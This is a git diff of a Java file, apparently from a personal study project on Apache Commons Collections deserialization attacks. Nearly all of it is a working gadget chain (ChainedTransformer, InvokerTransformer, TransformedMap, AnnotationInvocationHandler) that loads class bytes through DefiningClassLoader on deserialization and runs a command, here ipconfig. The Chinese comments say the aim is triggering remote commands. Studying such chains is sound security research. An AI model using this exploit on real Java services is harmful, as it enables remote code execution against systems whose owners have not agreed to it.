@@ -1,6 +1,7 @@
 package com.xyh.collections3.no2;
 
-import com.xyh.collections3.SerializeUtil;
+import com.xyh.utils.FileToByteArrayUtil;
+import com.xyh.utils.SerializeUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -8,9 +9,6 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
 import org.mozilla.javascript.DefiningClassLoader;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
@@ -26,8 +24,34 @@ import java.util.Map;
 public class SerializeMapForTransformer {
     public static void main(String[] args) throws Throwable {
 //        testCallbackRuntime();
+//        testAnnotationInvocationHandlerForDefineClass();
 
-        testAnnotationInvocationHandlerForDefineClass();
+        //测试加载class时触发远程指令
+        testCallbackRuntime2();
+        //测试反序列化加载class时触发远程指令
+//        testStaticClassInitForDefineClass();
+
+    }
+
+    private static void testStaticClassInitForDefineClass() throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(DefiningClassLoader.class),
+                new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[0]}),
+                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[0]}),
+                new InvokerTransformer("defineClass",new Class[]{String.class,byte[].class},new Object[]{"com.xyh.collections3.no2.CallbackRuntime2", FileToByteArrayUtil.readCallbackRuntimeClassBytes("target/classes/com/xyh/collections3/no2/CallbackRuntime2.class")}),
+                new InvokerTransformer("newInstance",new Class[]{},new Object[]{})
+        };
+        Transformer transformer = new ChainedTransformer(transformers);
+        Map inner = new HashMap();
+        inner.put("value","value");
+        Map ouputMap = TransformedMap.decorate(inner,null,transformer);
+        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
+        ctor.setAccessible(true);
+        Object o = ctor.newInstance(Target.class,ouputMap);
+        //序列化输出
+        byte[] bytes = SerializeUtil.serialize(o);
+        //反序列化
+        SerializeUtil.deserialize(bytes);
     }
 
     private static void testAnnotationInvocationHandlerForDefineClass() throws Exception {
@@ -35,7 +59,7 @@ public class SerializeMapForTransformer {
                 new ConstantTransformer(DefiningClassLoader.class),
                 new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[0]}),
                 new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[0]}),
-                new InvokerTransformer("defineClass",new Class[]{String.class,byte[].class},new Object[]{"com.xyh.collections3.no2.CallbackRuntime",readCallbackRuntimeClassBytes()}),
+                new InvokerTransformer("defineClass",new Class[]{String.class,byte[].class},new Object[]{"com.xyh.collections3.no2.CallbackRuntime", FileToByteArrayUtil.readCallbackRuntimeClassBytes("target/classes/com/xyh/collections3/no2/CallbackRuntime.classs")}),
                 new InvokerTransformer("newInstance",new Class[]{},new Object[]{}),
                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"ipconfig"})
         };
@@ -52,16 +76,11 @@ public class SerializeMapForTransformer {
         SerializeUtil.deserialize(bytes);
     }
 
-    private static byte[] readCallbackRuntimeClassBytes() throws IOException {
-        //执行前先编译CallbackRuntime类得到class文件
-        FileInputStream fileInputStream = new FileInputStream(new File("target/classes/com/xyh/collections3/no2/CallbackRuntime.class"));
-        byte[] bytes = new byte[fileInputStream.available()];
-        fileInputStream.read(bytes);
-        return bytes;
-    }
-
     private static void testCallbackRuntime() throws Throwable {
         new CallbackRuntime().exec("ipconfig");
     }
 
+    private static void testCallbackRuntime2() throws Throwable {
+        new CallbackRuntime2();
+    }
 }
